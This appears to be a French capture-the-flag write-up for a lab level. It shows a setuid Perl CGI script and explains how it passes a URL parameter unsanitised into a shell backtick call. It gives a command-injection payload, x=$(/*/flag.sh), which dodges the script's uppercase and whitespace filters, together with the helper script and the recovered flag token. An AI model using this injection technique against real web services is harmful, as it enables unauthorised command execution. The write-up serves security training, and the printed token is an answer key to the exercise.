## Démarche
- Dans le home, un script perl.
  - `ls -la`
    > -rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
  - `cat level12.pl`
    ```
        #!/usr/bin/env perl
        # localhost:4646
        use CGI qw{param};
        print "Content-type: text/html\n\n";

        sub t {
        $nn = $_[1];
        $xx = $_[0];
        $xx =~ tr/a-z/A-Z/;
        $xx =~ s/\s.*//;
        @output = `egrep "^$xx" /tmp/xd 2>&1`;
        foreach $line (@output) {
            ($f, $s) = split(/:/, $line);
            if($s =~ $nn) {
                return 1;
            }
        }
        return 0;
        }

        sub n {
        if($_[0] == 1) {
            print("..");
        } else {
            print(".");
        }
        }

        n(t(param("x"), param("y")));
    ```

    Les lignes `$xx =~ tr/a-z/A-Z/;` et `$xx =~ s/\s.*//;` sont des expressions régulières. L'opérateur `tr/` indique une translittération et `s/` une substitution.
    `$xx =~ tr/a-z/A-Z/` transforme les minuscules en majuscules et `$xx =~ s/\s.*//;` retire tous les caractères après les espaces (inclus).

- Il suffit donc de se connecter via un navigateur à `192.168.0.17:4646` et d'y saisir les paramètres qui permettront de lancer le binaire `getflag`
    - créer un script avec un nom en majuscules (pour la regexp) qui lancera getflag et sauvegardera le résultat dans un autre fichier :
        ```
            #!/usr/bin/env sh

            getflag > /tmp/flag12
        ```
    - appeler le script via les paramètres de l'url
        `http://192.168.0.17:4646/?x=$(/*/flag.sh)`

    - récupérer le flag dans le fichier :
        `cat /tmp/flag12`
        > Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

## Ressources
- [Guide Perl : expressions régulières](https://formation-perl.fr/guide-perl-08.html)
- https://regex101.com/